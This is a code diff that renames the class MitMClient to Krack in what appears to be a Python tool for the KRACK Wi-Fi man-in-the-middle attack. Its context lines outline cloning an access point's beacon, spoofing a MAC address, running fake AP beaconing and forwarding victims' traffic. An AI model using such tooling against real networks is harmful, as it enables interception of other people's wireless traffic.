@@ -247,7 +247,7 @@ class SocketClient(L2Socket):
             return None
 
 
-class MitMClient:
+class Krack:
     def __init__(self, args):
         self.iface_ap = args.iface_ap
         self.iface_client = args.iface_client
@@ -642,7 +642,7 @@ if __name__ == "__main__":
     """
     0. Initialization
     """
-    mitmClient = MitMClient(args)
+    krack = Krack(args)
 
     s_ap = SocketClient(iface=args.iface_ap)
     s_client = SocketClient(iface=args.iface_client)
@@ -650,22 +650,22 @@ if __name__ == "__main__":
     """
     1. Get Beacon of AP to clone
     """
-    mitmClient.get_ap_beacon()
+    krack.get_ap_beacon()
 
     """
     2. Get probe response we will use ourselves
     """
-    mitmClient.get_ap_probe_response()
+    krack.get_ap_probe_response()
 
     """
     3. Set device MAC address
     """
-    mitmClient.set_iface_mac_address()
+    krack.set_iface_mac_address()
 
     """
     4. Start Fake AP Beaconing
     """
-    ap_beacon_thread = threading.Thread(target=mitmClient.send_ap_beacon)
+    ap_beacon_thread = threading.Thread(target=krack.send_ap_beacon)
     ap_beacon_thread.setDaemon(True)
     ap_beacon_thread.start()
 
@@ -682,4 +682,4 @@ if __name__ == "__main__":
     """
     6. Forward traffic when needed
     """
-    mitmClient.run()
+    krack.run()
